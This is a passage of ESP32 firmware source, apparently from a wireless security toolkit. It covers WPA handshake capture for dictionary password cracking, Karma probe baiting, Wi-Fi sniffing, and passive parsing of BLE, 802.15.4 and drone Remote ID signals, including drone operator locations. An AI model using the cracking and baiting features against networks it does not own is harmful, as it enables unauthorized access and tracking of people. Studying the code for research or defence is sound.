 *  keyver 3 (802.11w PMF) 的 KCK 走 SHA256-KDF + AES-CMAC, 板载未实现 →
 *  标记 unsupported, 用 /api/handshake/dump 导出后交服务端 /api/wpa/crack 跑。
 */
struct HandshakeState {
  bool capturing = false;
  bool m1 = false, m2 = false, m3 = false, m4 = false;
  bool pmkid = false;
  bool captured = false;      // 已拿到可用于跑包的 M1 + M2
  bool unsupported = false;   // keyver 3 (PMF) 板载不支持
  bool hasTarget = false;     // 只接收该 BSSID 的握手帧, 避免混入邻近网络
  bool cracking = false;
  uint8_t keyver = 2;
  uint8_t targetBssid[6] = {0};
  uint8_t anonce[32] = {0};
  uint8_t snonce[32] = {0};
  uint8_t bssid[6] = {0};
  uint8_t stmac[6] = {0};
  uint8_t eapol[256] = {0};   // M2 的 EAPOL-Key 帧 (从 802.1X 头开始)
  uint16_t eapolLen = 0;
  uint32_t frameCount = 0;    // 收到的 EAPOL-Key 帧总数
  String essid = "";          // 跑包用 ESSID (目标 AP 的 SSID, 即 PBKDF2 的盐)
  uint32_t crackProgress = 0;
  uint32_t crackTotal = (uint32_t)WIFI_WEAK_DICT_COUNT;
  uint32_t crackAttempts = 0;
  String crackedPass = "";
  uint32_t crackStartTime = 0;
  uint32_t captureStartTime = 0;
  bool channelMoved = false;
  uint8_t restoreChannel = 0;
};
static HandshakeState sHandshake;
// 抓包进度日志去重标记 (只在状态首次变化时打一条, 避免刷屏)
static bool sHsLoggedM1 = false, sHsLoggedM2 = false, sHsLoggedDone = false;

static String hexBytes(const uint8_t *p, size_t n) {
  static const char HEXD[] = "0123456789abcdef";
  String out;
  out.reserve((unsigned int)(n * 2));
  for (size_t i = 0; i < n; i++) {
    out += HEXD[(p[i] >> 4) & 0x0F];
    out += HEXD[p[i] & 0x0F];
  }
  return out;
}

// 802.11 数据帧 → EAPOL-Key 帧的定位: 跳过 MAC 头 (含 QoS/HTC) 与 LLC/SNAP。
// 返回 EAPOL 起始偏移, 失败返回 -1。QoS/HTC 在不同驱动上偏移差 2/4 字节, 容错探测。
static int eapolOffset(const uint8_t *f, int len) {
  static const uint8_t SNAP[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const uint8_t fc0 = f[0];
  const uint8_t subtype = fc0 >> 4;
  const bool toDs = (fc0 & 0x01) != 0;
  const bool fromDs = (fc0 & 0x02) != 0;
  int hdr = 24;
  if (toDs && fromDs) hdr += 6;      // WDS
  if (subtype & 0x08) hdr += 2;      // QoS Data
  if (f[1] & 0x80) hdr += 4;         // Order → HT Control
  for (int delta = 0; delta <= 6; delta += 2) {
    int p = hdr + delta;
    if (p + 8 > len) break;
    if (memcmp(f + p, SNAP, 8) == 0) return p + 8;
  }
  return -1;
}

/* ---- 抓包观察器共用缓冲区 (Sniffer / Airodump / Karma) ----
 * 三者与握手捕获共用同一个 promiscuous 回调; 回调运行在 WiFi 任务上下文,
 * 只做定长缓冲写入, 不分配内存、不打日志。 */
struct SnifferPacket {
  uint32_t ts;
  uint8_t ch;
  int8_t rssi;
  char type[12];
  char src[18];
  char dst[18];
  char info[48];
};

struct SnifferState {
  bool running = false;
  uint8_t channel = 6;
  bool hopping = false;
  bool skipDfs = true;   // 5G 跳频时跳过 DFS (52-144), 避免雷达检测打断驻留
  uint32_t totalPackets = 0;
  uint32_t mgmtCount = 0;
  uint32_t ctrlCount = 0;
  uint32_t dataCount = 0;
  uint16_t fps = 0;
  uint16_t fpsAccum = 0;
  uint32_t lastFpsCalc = 0;
  uint32_t lastHopTime = 0;
  SnifferPacket packets[16];
  uint8_t packetHead = 0;
  uint8_t packetCount = 0;
};
static SnifferState sSniffer;

// kind: 0=管理帧 1=控制帧 2=数据帧
static void addSnifferPacket(uint8_t ch, int8_t rssi, const char *type, const char *src,
                             const char *dst, const char *info, uint8_t kind) {
  SnifferPacket &p = sSniffer.packets[sSniffer.packetHead];
  p.ts = millis();
  p.ch = ch;
  p.rssi = rssi;
  strlcpy(p.type, type, sizeof(p.type));
  strlcpy(p.src, src, sizeof(p.src));
  strlcpy(p.dst, dst, sizeof(p.dst));
  strlcpy(p.info, info, sizeof(p.info));
  sSniffer.packetHead = (sSniffer.packetHead + 1) % 16;
  if (sSniffer.packetCount < 16) sSniffer.packetCount++;
  sSniffer.totalPackets++;
  sSniffer.fpsAccum++;
  if (kind == 2) sSniffer.dataCount++;
  else if (kind == 1) sSniffer.ctrlCount++;
  else sSniffer.mgmtCount++;
}

struct AirodumpStation {
  char mac[18];
  char bssid[18];
  int8_t rssi;
  uint32_t packets;
  char probes[48];
};

struct AirodumpState {
  bool running = false;
  bool hopping = true;
  bool skipDfs = true;   // 5G 跳频时跳过 DFS (52-144)
  uint8_t currentChannel = 1;
  uint32_t lastHopTime = 0;
  AirodumpStation stations[8];
  uint8_t stationCount = 0;
};
static AirodumpState sAirodump;

struct KarmaProbe {
  char mac[18];
  char ssid[33];
  int8_t rssi;
  uint32_t ts;
  bool baited;
};

struct KarmaState {
  bool running = false;
  uint32_t probesCaptured = 0;
  uint32_t probesBaited = 0;
  KarmaProbe probes[10];
  uint8_t probeCount = 0;
  uint8_t probeHead = 0;
};
static KarmaState sKarma;

/* ---------------- P4-3: ASTM F3411 Remote ID ----------------
 * 纯被动解析两路载体:
 *   - BLE 广播: Service Data UUID 0xFFFA + App Code 0x0D + ODID 消息包;
 *   - WiFi Beacon / ProbeResp: 厂商 IE (id=0xDD, OUI FA-0B-BC, OUI Type 0x0D)。
 * 只解析 Basic ID(0) / Location(1) / System(4) / Message Pack(0xF); Auth(2) /
 * Self-ID(3) / Operator ID(5) 先跳过 (保留原始抓包即可)。所有读取先按长度校验,
 * 解析失败只返回 false, 不影响分类与既有字段。
 */
static constexpr int RID_MAX = 8;
static constexpr uint32_t RID_TTL_MS = 120000;  // 2 分钟未更新视为过期

enum RidTransport : uint8_t { RID_TRANSPORT_BLE = 0, RID_TRANSPORT_WIFI = 1 };
enum RidFlags : uint8_t {
  RID_FLAG_BASIC = 0x01,     // 有 UAS ID / UA 类型 / ID 类型
  RID_FLAG_LOCATION = 0x02,  // 有无人机位置
  RID_FLAG_OPERATOR = 0x04,  // 有操作员位置
};

// 一次解析结果 (消息包中不同消息只带部分字段, 由调用方逐位合并)
struct RidData {
  uint8_t flags;
  uint8_t uaType;
  uint8_t idType;
  char uasId[21];  // 20 字节 UAS ID + NUL, 不可打印字节替换为 '.'
  int32_t lat, lon;   // 1e-7 度
  int16_t alt;        // 地理高度 (米)
  int32_t opLat, opLon;
  int16_t opAlt;
};

struct RidEntry {
  char mac[18];
  uint8_t transport;
  RidData d;
  int32_t rssi;
  uint32_t firstSeen;
  uint32_t lastSeen;
  bool used;
};
static RidEntry sRid[RID_MAX];
static portMUX_TYPE sRidMux = portMUX_INITIALIZER_UNLOCKED;

// ODID 全部多字节字段都是小端
static uint16_t rdU16(const uint8_t *p) {
  return (uint16_t)((uint16_t)p[0] | ((uint16_t)p[1] << 8));
}

static int32_t rdI32(const uint8_t *p) {
  return (int32_t)((uint32_t)p[0] | ((uint32_t)p[1] << 8) |
                   ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24));
}

static void ridCopyUasId(char *out, const uint8_t *src) {
  int n = 0;
  for (int i = 0; i < 20; i++) {
    const uint8_t c = src[i];
    if (c == 0) break;
    // 只保留可打印 ASCII, 并替换 JSON 敏感字符, 之后可直接拼进 JSON
    out[n++] = (c >= 0x20 && c <= 0x7E && c != '"' && c != '\\') ? (char)c : '.';
  }
  while (n > 0 && out[n - 1] == ' ') n--;
  out[n] = '\0';
}

// RID 数据字段的共用 JSON 片段 (BLE 设备对象与 /api/rid 使用同一份实现)。
// 固定输出全部字段, 由 flags 决定 UI 是否展示, 避免多分支拼接造成的代码膨胀。
static void ridAppendFields(String &json, const RidData &d) {
  char buf[224];
  snprintf(buf, sizeof(buf),
           "\"flags\":%u,\"uasId\":\"%s\",\"uaType\":%u,\"idType\":%u,"
           "\"lat\":%ld,\"lon\":%ld,\"alt\":%d,"
           "\"opLat\":%ld,\"opLon\":%ld,\"opAlt\":%d",
           (unsigned)d.flags, d.uasId, (unsigned)d.uaType, (unsigned)d.idType,
           (long)d.lat, (long)d.lon, (int)d.alt,
           (long)d.opLat, (long)d.opLon, (int)d.opAlt);
  json += buf;
}

static bool ridCoordValid(int32_t lat, int32_t lon) {
  // 规范中 (0,0) 表示「无值/未知」
  return lat >= -900000000 && lat <= 900000000 &&
         lon >= -1800000000 && lon <= 1800000000 &&
         !(lat == 0 && lon == 0);
}

// 单条 25 字节 ODID 消息 (调用方保证长度)
static void ridParseMessage(const uint8_t *m, RidData &o) {
  switch (m[0] >> 4) {
    case 0:  // Basic ID: UA 类型 + ID 类型 + 20 字节 UAS ID
      o.uaType = m[1] & 0x0F;
      o.idType = (m[1] >> 4) & 0x0F;
      ridCopyUasId(o.uasId, m + 2);
      o.flags |= RID_FLAG_BASIC;
      break;
    case 1: {  // Location/Vector: 无人机经纬度在偏移 5 / 9, 地理高度在 15
      const int32_t lat = rdI32(m + 5), lon = rdI32(m + 9);
      if (ridCoordValid(lat, lon)) {
        o.lat = lat;
        o.lon = lon;
        o.alt = (int16_t)((int32_t)rdU16(m + 15) / 2 - 1000);  // 0.5m 分辨率, 偏置 -1000m
        o.flags |= RID_FLAG_LOCATION;
      }
      break;
    }
    case 4: {  // System: 操作员经纬度在偏移 2 / 6, 操作员高度在 18
      const int32_t lat = rdI32(m + 2), lon = rdI32(m + 6);
      if (ridCoordValid(lat, lon)) {
        o.opLat = lat;
        o.opLon = lon;
        o.opAlt = (int16_t)((int32_t)rdU16(m + 18) / 2 - 1000);
        o.flags |= RID_FLAG_OPERATOR;
      }
      break;
    }
    default:
      break;  // Auth / Self-ID / Operator ID 暂不解析
  }
}

// 解析一个 ODID 消息或消息包 (不含 BLE App Code / WiFi OUI)
static bool ridParsePack(const uint8_t *p, int len, RidData &o) {
  memset(&o, 0, sizeof(o));
  if (!p || len < 25) return false;
  if ((p[0] >> 4) == 0x0F) {  // Message Pack: header + 单条长度 + 条数 + N×25
    if (len < 3) return false;
    const int sz = p[1];
    const int cnt = p[2];
    if (sz != 25) return false;
    int off = 3;
    for (int i = 0; i < cnt && off + 25 <= len; i++, off += 25) {
      ridParseMessage(p + off, o);
    }
  } else {
    ridParseMessage(p, o);
  }
  return o.flags != 0;
}

// BLE 库的 MAC 是小写, WiFi 侧用大写; 统一成大写再做键
static void ridNormalizeMac(char *out, const char *mac) {
  int n = 0;
  for (const char *p = mac; *p && n < 17; p++) {
    char c = *p;
    if (c >= 'a' && c <= 'f') c = (char)(c - 'a' + 'A');
    out[n++] = c;
  }
  out[n] = '\0';
}

// 按 MAC 归并 (BLE 与 WiFi 同一架无人机可能同时被抓到), 只合并新解析出的字段
static void ridUpsert(const char *mac, uint8_t transport, int32_t rssi, const RidData &d) {
  if (!mac || !mac[0] || !d.flags) return;
  char key[18];
  ridNormalizeMac(key, mac);
  const uint32_t now = millis();
  portENTER_CRITICAL(&sRidMux);
  int idx = -1;
  for (int i = 0; i < RID_MAX; i++) {
    if (sRid[i].used && strcmp(sRid[i].mac, key) == 0) { idx = i; break; }
  }
  if (idx < 0) {
    for (int i = 0; i < RID_MAX; i++) {
      if (!sRid[i].used || (uint32_t)(now - sRid[i].lastSeen) > RID_TTL_MS) { idx = i; break; }
    }
  }
  if (idx < 0) {  // 表满: 淘汰最久未更新的条目
    uint32_t oldest = UINT32_MAX;
    for (int i = 0; i < RID_MAX; i++) {
      if (sRid[i].lastSeen < oldest) { oldest = sRid[i].lastSeen; idx = i; }
    }
  }
  RidEntry &e = sRid[idx];
  if (!e.used || strcmp(e.mac, key) != 0) {
    e = RidEntry{};
    strlcpy(e.mac, key, sizeof(e.mac));
    e.firstSeen = now;
  }
  e.used = true;
  e.transport = transport;
  e.rssi = rssi;
  e.lastSeen = now;
  if (d.flags & RID_FLAG_BASIC) {
    e.d.flags |= RID_FLAG_BASIC;
    e.d.uaType = d.uaType;
    e.d.idType = d.idType;
    memcpy(e.d.uasId, d.uasId, sizeof(e.d.uasId));
  }
  if (d.flags & RID_FLAG_LOCATION) {
    e.d.flags |= RID_FLAG_LOCATION;
    e.d.lat = d.lat;
    e.d.lon = d.lon;
    e.d.alt = d.alt;
  }
  if (d.flags & RID_FLAG_OPERATOR) {
    e.d.flags |= RID_FLAG_OPERATOR;
    e.d.opLat = d.opLat;
    e.d.opLon = d.opLon;
    e.d.opAlt = d.opAlt;
  }
  portEXIT_CRITICAL(&sRidMux);
}

#if FW_BLE_SUPPORTED
/* ---------------- BLE 嗅探 (P2) ----------------
 * 纯被动: setActiveScan(false) → 不发 SCAN_REQ / 不建立连接, 只听广播。
 * 射频共用: BLE 与 WiFi 共用一个射频前端, 扫描时 AP 保持在线, 由控制器共存
 *   仲裁分时; 默认占空比 50% (interval 100ms / window 50ms), AP 吞吐会下降,
 *   面板上需明确提示。停止扫描时归还射频占用并拆掉协议栈。
 * 生命周期: 所有 BLE 栈调用 (init / scan / stop / deinit) 都集中在 bleTaskFunc
 *   单任务内串行执行, 避免在 HTTP 处理任务里做阻塞初始化, 也避免多任务并发
 *   操作协议栈。HTTP 层只翻 want 标志。
 *
 * 为什么 wantDuplicates=true: Arduino BLE 库在两种后端下都只在「首次发现」时回调,
 *   要拿到逐条广播 (实时 RSSI / 广播计数) 必须打开重复上报; 已确认该路径不会在
 *   库内部的 map 里累积对象 (Bluedroid 回调后 delete 临时对象, NimBLE 只更新
 *   已存在条目), 因此长时间扫描不会泄漏内存。
 */
static constexpr int BLE_MAX_DEVICES = 24;
static constexpr int BLE_TASK_STACK = 8192;
static constexpr uint16_t BLE_SCAN_INTERVAL_MS = 100;  // 扫描间隔
static constexpr uint16_t BLE_SCAN_WINDOW_MS = 50;     // 扫描窗口 (占空比 50%)

struct BleDeviceEntry {
  char mac[18];
  char name[33];
  uint8_t mfg[8];        // Manufacturer Data 前 8 字节 (companyId = 前 2 字节小端)
  uint8_t mfgLen;
  uint16_t companyId;    // 0 = 无厂商数据 / 数据不足 2 字节
  uint16_t svcUuid;      // 首个 16-bit Service Data UUID，否则 Service UUID；0 = 无
  uint8_t svcData[8];    // Service Data 前 8 字节 (Eddystone/BTHome/Remote ID 前缀)
  uint8_t svcDataLen;
  uint8_t devClass;      // BleDevClass, 固件判定, UI 只映射文案
  uint8_t ridFlags;      // P4-3: RID_FLAG_* (basic/location/operator)
  uint8_t ridUaType;     // P4-3: UA 类型 (0 未知 … 15 其他)
  uint8_t ridIdType;     // P4-3: ID 类型 (序列号 / CAA / UTM UUID / 会话 ID)
  char ridUasId[21];     // P4-3: 20 字节 UAS ID + NUL
  int32_t ridLat;        // P4-3: 1e-7 度
  int32_t ridLon;
  int16_t ridAlt;        // P4-3: 地理高度 (米)
  int32_t ridOpLat;      // P4-3: 操作员位置 (1e-7 度)
  int32_t ridOpLon;
  int16_t ridOpAlt;
  int32_t rssi;
  uint32_t advCount;
  uint32_t lastSeen;
  uint8_t addrType;
  uint8_t advType;
  bool randomMac;        // MAC 首字节 bit1 = 1 (本地管理 / 随机地址)
  bool used;
};

// 设备类别: 下标必须与 firmware/data/vendor_db.js 的 classes 数组一致。
enum BleDevClass : uint8_t {
  BLE_DEV_UNKNOWN = 0,
  BLE_DEV_AIRTAG,     // Apple Find My / AirTag
  BLE_DEV_IBEACON,
  BLE_DEV_EDDYSTONE,
  BLE_DEV_BTHOME,
  BLE_DEV_XIAOMI,
  BLE_DEV_GOVEE,
  BLE_DEV_RUUVI,
  BLE_DEV_FASTPAIR,
  BLE_DEV_RID,        // ASTM F3411 Remote ID (详细解析在 P4-3)
};

// 协议栈回调 -> 临界区之间使用的栈上快照 (只含定长字段, 无 String / 堆分配)
struct BleAdvSample {
  char mac[18];
  char name[33];
  uint8_t mfg[8];
  uint8_t mfgLen;
  uint16_t companyId;
  uint16_t svcUuid;
  uint8_t svcData[8];
  uint8_t svcDataLen;
  uint8_t devClass;
  RidData rid;           // P4-3: 从完整 Service Data 解析 (未命中时 flags=0)
  int32_t rssi;
  uint8_t addrType;
  uint8_t advType;
  bool randomMac;
};

enum BlePhase : uint8_t { BLE_IDLE = 0, BLE_STARTING, BLE_RUNNING, BLE_STOPPING };

struct BleState {
  volatile bool want = false;        // HTTP 层请求状态: true = 希望处于扫描中
  volatile bool initFailed = false;  // 最近一次启动是否失败 (供 UI 显示)
  volatile uint8_t phase = BLE_IDLE;
  volatile bool sliceDone = false;   // 本轮扫描是否已自然结束 (由协议栈回调置位)
  uint32_t totalAdv = 0;
  uint32_t scanStartedAt = 0;
  uint16_t durationSec = 0;          // 0 = 持续 (按 10s 切片循环)
  BleDeviceEntry devices[BLE_MAX_DEVICES];
  uint8_t deviceCount = 0;
  portMUX_TYPE mux = portMUX_INITIALIZER_UNLOCKED;
};
static BleState sBLE;

// 单切片时长: 持续模式按此长度循环, 保证库内部结果表周期性清空、RSSI 保持新鲜
static constexpr uint32_t BLE_SLICE_SEC = 10;

class BleAdvCallbacks : public BLEAdvertisedDeviceCallbacks {
public:
  void onResult(BLEAdvertisedDevice d) override;
};

// 单例: BLEScan 只保存回调指针、从不 delete 它, 若每切片 new 一个会持续泄漏
static BleAdvCallbacks sBleAdvCallbacks;

// 只在临界区内做纯内存拷贝 (无 String / 无堆分配)
static void bleStoreAdv(const BleAdvSample &s) {
  uint32_t now = millis();
  portENTER_CRITICAL(&sBLE.mux);
  sBLE.totalAdv++;
  int idx = -1;
  for (int i = 0; i < BLE_MAX_DEVICES; i++) {
    if (sBLE.devices[i].used && strcmp(sBLE.devices[i].mac, s.mac) == 0) { idx = i; break; }
  }
  const bool isNew = (idx < 0);
  if (isNew) {
    for (int i = 0; i < BLE_MAX_DEVICES; i++) {
      if (!sBLE.devices[i].used) { idx = i; break; }
    }
    if (idx < 0) {  // 表满: 淘汰最久未出现的条目
      uint32_t oldest = UINT32_MAX;
      for (int i = 0; i < BLE_MAX_DEVICES; i++) {
        if (sBLE.devices[i].lastSeen < oldest) { oldest = sBLE.devices[i].lastSeen; idx = i; }
      }
    }
  }
  if (idx >= 0) {
    BleDeviceEntry &e = sBLE.devices[idx];
    if (isNew) {
      e = BleDeviceEntry{};
      strlcpy(e.mac, s.mac, sizeof(e.mac));
      e.ridLat = INT32_MIN;
      e.ridLon = INT32_MIN;
      e.ridAlt = INT16_MIN;
      e.advCount = 1;
      e.addrType = s.addrType;
      e.advType = s.advType;
      e.randomMac = s.randomMac;
    } else {
      e.advCount++;
    }
    e.used = true;
    e.rssi = s.rssi;
    e.lastSeen = now;
    if (s.name[0] && !e.name[0]) strlcpy(e.name, s.name, sizeof(e.name));
    // 后续广播只补空字段, 不覆盖已识别的厂商 / 类别
    if (s.mfgLen && !e.mfgLen) {
      e.mfgLen = s.mfgLen;
      memcpy(e.mfg, s.mfg, s.mfgLen);
    }
    if (s.companyId && !e.companyId) e.companyId = s.companyId;
    if (s.svcUuid && !e.svcUuid) e.svcUuid = s.svcUuid;
    if (s.svcDataLen && !e.svcDataLen) {
      e.svcDataLen = s.svcDataLen;
      memcpy(e.svcData, s.svcData, s.svcDataLen);
    }
    if (s.devClass != BLE_DEV_UNKNOWN && e.devClass == BLE_DEV_UNKNOWN) e.devClass = s.devClass;
    // P4-3: Remote ID 按消息类型逐位合并 (一个广播可能只带 Basic ID 或只带 Location)
    if (s.rid.flags & RID_FLAG_BASIC) {
      e.ridFlags |= RID_FLAG_BASIC;
      e.ridUaType = s.rid.uaType;
      e.ridIdType = s.rid.idType;
      memcpy(e.ridUasId, s.rid.uasId, sizeof(e.ridUasId));
    }
    if (s.rid.flags & RID_FLAG_LOCATION) {
      e.ridFlags |= RID_FLAG_LOCATION;
      e.ridLat = s.rid.lat;
      e.ridLon = s.rid.lon;
      e.ridAlt = s.rid.alt;
    }
    if (s.rid.flags & RID_FLAG_OPERATOR) {
      e.ridFlags |= RID_FLAG_OPERATOR;
      e.ridOpLat = s.rid.opLat;
      e.ridOpLon = s.rid.opLon;
      e.ridOpAlt = s.rid.opAlt;
    }
    uint8_t n = 0;
    for (int i = 0; i < BLE_MAX_DEVICES; i++) {
      if (sBLE.devices[i].used) n++;
    }
    sBLE.deviceCount = n;
  }
  portEXIT_CRITICAL(&sBLE.mux);
}

static uint8_t bleHexVal(char c) {
  if (c >= '0' && c <= '9') return (uint8_t)(c - '0');
  if (c >= 'A' && c <= 'F') return (uint8_t)(c - 'A' + 10);
  if (c >= 'a' && c <= 'f') return (uint8_t)(c - 'a' + 10);
  return 0;
}

// MAC 首字节 bit1 = 本地管理地址 (手机 / 手环普遍使用的随机 MAC)
static bool bleMacIsRandom(const char *mac) {
  if (!mac[0] || !mac[1]) return false;
  return (((bleHexVal(mac[0]) << 4) | bleHexVal(mac[1])) & 0x02) != 0;
}

// 只取 16-bit UUID; 32/128-bit 返回 0 (P4 的类别判定只依赖 16-bit 分配号)
static uint16_t bleUuid16(BLEUUID u) {
  if (u.bitSize() != 16) return 0;
#if defined(CONFIG_NIMBLE_ENABLED)
  const ble_uuid_any_t *native = u.getNative();
  return native ? native->u16.value : 0;
#elif defined(CONFIG_BLUEDROID_ENABLED)
  esp_bt_uuid_t *native = u.getNative();
  return native ? native->uuid.uuid16 : 0;
#else
  return 0;
#endif
}

// 分类规则只做整数比较, 不分配内存; 顺序 = 优先级
static uint8_t bleClassify(const BleAdvSample &s) {
  if (s.svcUuid == 0xFFFA && s.svcDataLen >= 1 && s.svcData[0] == 0x0D) return BLE_DEV_RID;
  if (s.companyId == 0x004C && s.mfgLen >= 4) {
    if (s.mfg[2] == 0x12 && s.mfg[3] == 0x19) return BLE_DEV_AIRTAG;
    if (s.mfg[2] == 0x02 && s.mfg[3] == 0x15) return BLE_DEV_IBEACON;
  }
  if (s.svcUuid == 0xFEAA) return BLE_DEV_EDDYSTONE;
  if (s.svcUuid == 0xFCD2) return BLE_DEV_BTHOME;
  if (s.companyId == 0xFE95 || s.svcUuid == 0xFE95) return BLE_DEV_XIAOMI;
  if (s.companyId == 0xEC88) return BLE_DEV_GOVEE;
  if (s.companyId == 0x0499) return BLE_DEV_RUUVI;
  if (s.svcUuid == 0xFE2C) return BLE_DEV_FASTPAIR;
  return BLE_DEV_UNKNOWN;
}

// 运行在协议栈 host 任务: 先把字段抽到栈上, 再进临界区
void BleAdvCallbacks::onResult(BLEAdvertisedDevice d) {
  if (!sBLE.want) return;  // 已请求停止, 丢弃迟到结果
  BleAdvSample s = {};
  strlcpy(s.mac, d.getAddress().toString().c_str(), sizeof(s.mac));
  s.randomMac = bleMacIsRandom(s.mac);
  if (d.haveName()) strlcpy(s.name, d.getName().c_str(), sizeof(s.name));
  if (d.haveManufacturerData()) {
    String raw = d.getManufacturerData();
    int n = (int)raw.length();
    if (n > (int)sizeof(s.mfg)) n = (int)sizeof(s.mfg);
    if (n > 0) {
      memcpy(s.mfg, raw.c_str(), n);
      s.mfgLen = (uint8_t)n;
    }
    if (n >= 2) s.companyId = (uint16_t)((uint8_t)raw[0] | ((uint16_t)(uint8_t)raw[1] << 8));
  }
  if (d.haveServiceUUID()) s.svcUuid = bleUuid16(d.getServiceUUID());
  if (d.haveServiceData()) {
    uint16_t dataUuid = bleUuid16(d.getServiceDataUUID());
    // Service Data 的 UUID 更能代表载荷类型 (Eddystone/BTHome/Remote ID), 优先记录
    if (dataUuid) s.svcUuid = dataUuid;
    String sd = d.getServiceData();
    const int rawLen = (int)sd.length();
    int n = rawLen;
    if (n > (int)sizeof(s.svcData)) n = (int)sizeof(s.svcData);
    if (n > 0) {
      memcpy(s.svcData, sd.c_str(), n);
      s.svcDataLen = (uint8_t)n;
    }
    // P4-3: Remote ID 从完整 Service Data 解析 (App Code 0x0D + ODID 消息包),
    // svcData[8] 只用于分类与展示, 不承担完整解析。
    if (dataUuid == 0xFFFA && rawLen >= 26 && (uint8_t)sd[0] == 0x0D) {
      ridParsePack((const uint8_t *)sd.c_str() + 1, rawLen - 1, s.rid);
    }
  }
  s.devClass = bleClassify(s);
  s.rssi = (int32_t)d.getRSSI();
  s.addrType = d.getAddressType();
  s.advType = d.getAdvType();
  bleStoreAdv(s);
  if (s.rid.flags) ridUpsert(s.mac, RID_TRANSPORT_BLE, s.rssi, s.rid);
}

// 运行在协议栈 host 任务: 只置标志, 不在这里调用任何 BLEScan 方法 (避免重入)
static void onBleScanDone(BLEScanResults) {
  sBLE.sliceDone = true;
}

static const char *bleAdvTypeStr(uint8_t t) {
  // Bluedroid 与 NimBLE 的广播类型数值一致
  switch (t) {
    case 0: return "ADV_IND";
    case 1: return "ADV_DIRECT";
    case 2: return "ADV_SCAN";
    case 3: return "ADV_NONCONN";
    case 4: return "SCAN_RSP";
    default: return "UNKNOWN";
  }
}

static bool bleStartScanSlice(uint32_t seconds) {
  BLEScan *scan = BLEDevice::getScan();
  if (!scan) return false;
  scan->setActiveScan(false);  // 纯被动
  scan->setInterval(BLE_SCAN_INTERVAL_MS);
  scan->setWindow(BLE_SCAN_WINDOW_MS);
  scan->setAdvertisedDeviceCallbacks(&sBleAdvCallbacks, true);
  return scan->start(seconds, onBleScanDone, false);
}

static void bleTaskFunc(void *) {
  for (;;) {
    vTaskDelay(50 / portTICK_PERIOD_MS);
    const uint8_t phase = sBLE.phase;

    if (sBLE.want && phase == BLE_IDLE) {
      sBLE.phase = BLE_STARTING;
      sBLE.initFailed = false;
      log("[ble] 初始化 BLE 协议栈...");
      if (!BLEDevice::init("esp32-ble-sniffer")) {
        log("[ble] BLE 初始化失败 (协议栈不可用)");
        sBLE.initFailed = true;
        sBLE.want = false;
        sBLE.phase = BLE_IDLE;
        continue;
      }
      portENTER_CRITICAL(&sBLE.mux);
      for (int i = 0; i < BLE_MAX_DEVICES; i++) sBLE.devices[i].used = false;
      sBLE.deviceCount = 0;
      sBLE.totalAdv = 0;
      portEXIT_CRITICAL(&sBLE.mux);
      sBLE.scanStartedAt = millis();
      sBLE.sliceDone = false;
      sBLE.phase = BLE_RUNNING;
      if (!sBLE.want) {  // 初始化期间已被请求停止
        sBLE.phase = BLE_STOPPING;
      } else {
        uint32_t slice = sBLE.durationSec ? sBLE.durationSec : BLE_SLICE_SEC;
        if (bleStartScanSlice(slice)) {
          log("[ble] BLE 被动扫描已启动" +
              String(sBLE.durationSec ? (" (限时 " + String(sBLE.durationSec) + "s)")
                                      : String(" (持续, 10s 切片刷新)")));
          emitLabState("ble", true);
        } else {
          log("[ble] 扫描启动失败");
          sBLE.initFailed = true;
          sBLE.want = false;
          sBLE.phase = BLE_STOPPING;
        }
      }
      continue;
    }

    if (sBLE.want && phase == BLE_RUNNING && sBLE.sliceDone) {
      // 本轮切片自然结束: 持续模式重开一轮, 限时模式到此收尾
      sBLE.sliceDone = false;
      if (sBLE.durationSec == 0 && sBLE.want) {
        if (!bleStartScanSlice(BLE_SLICE_SEC)) {
          log("[ble] 续扫失败, 停止扫描");
          sBLE.want = false;
          sBLE.phase = BLE_STOPPING;
        }
      } else {
        sBLE.want = false;
        sBLE.phase = BLE_STOPPING;
      }
      continue;
    }

    if (!sBLE.want && (phase == BLE_RUNNING || phase == BLE_STOPPING || phase == BLE_STARTING)) {
      sBLE.phase = BLE_STOPPING;
      BLEScan *scan = BLEDevice::getScan();
      if (scan) scan->stop();
      const uint32_t total = sBLE.totalAdv;
      const uint8_t cnt = sBLE.deviceCount;
      BLEDevice::deinit(false);  // 停协议栈/控制器并归还射频, 保留 BT 内存以便再次启动
      sBLE.phase = BLE_IDLE;
      sBLE.sliceDone = false;
      log("[ble] BLE 扫描已停止, 累计 " + String(total) + " 条广播 / " + String(cnt) + " 个设备");
      emitLabState("ble", false);
      continue;
    }
  }
}
#endif /* FW_BLE_SUPPORTED */

#if FW_IEEE802154_SUPPORTED
/* ---------------- 802.15.4 嗅探 (P3) ----------------
 * 纯被动: promiscuous 模式只接收, 不发帧、不自动 ACK、不做任何注入。
 * 射频共用: 802.15.4 与 WiFi 2.4G 是同一个 2.4GHz 射频前端, 框架开启了
 *   CONFIG_ESP_COEX_SW_COEXIST_ENABLE, 由共存仲裁分时。AP 保持在线, 但抓包是
 *   「采样」而非「全量」: AP 与目标信道重叠时丢帧更明显, 面板如实提示。
 *   (不采用「停 AP 再扫」: 后台 UI 就跑在 AP 上, 停 AP 等于把控制通道切断。)
 * 两种模式:
 *   frames —— 在固定信道或 11..26 跳频收帧, 统计帧类型 / PAN / 源地址;
 *   energy —— 对 11..26 逐个做能量检测 (ED), 绘制信道占用条。
 * 生命周期: 所有 802.15.4 栈调用 (enable / set_channel / receive / energy_detect /
 *   disable) 都集中在 i154TaskFunc 单任务内串行执行; HTTP 层只翻 want。
 * ISR 约束: receive_done / energy_detect_done 在 ISR 上下文执行, 必须 IRAM_ATTR,
 *   只允许纯整数解析和临界区内的定长拷贝 (禁止 String / 日志 / 堆分配)。
 */
static constexpr int I154_PAN_MAX = 12;
static constexpr int I154_DEV_MAX = 20;
static constexpr uint8_t I154_CH_MIN = 11;
static constexpr uint8_t I154_CH_MAX = 26;
static constexpr uint32_t I154_DWELL_MS = 500;         // 跳频时单信道驻留
static constexpr uint32_t I154_ED_SYMBOLS = 320;       // 能量检测时长 (symbol, 16us → 5.12ms)
static constexpr int I154_TASK_STACK = 6144;

enum I154Phase : uint8_t { I154_IDLE = 0, I154_STARTING, I154_RUNNING, I154_STOPPING };
enum I154Mode : uint8_t { I154_MODE_FRAMES = 0, I154_MODE_ENERGY = 1 };

struct I154PanEntry {
  uint16_t panId;
  uint32_t frames;
  int8_t rssi;
  uint8_t ch;
  uint32_t lastSeen;
  bool used;
};

struct I154DevEntry {
  uint8_t addr[8];   // 扩展地址按帧内字节序 (LSB first) 原样保存
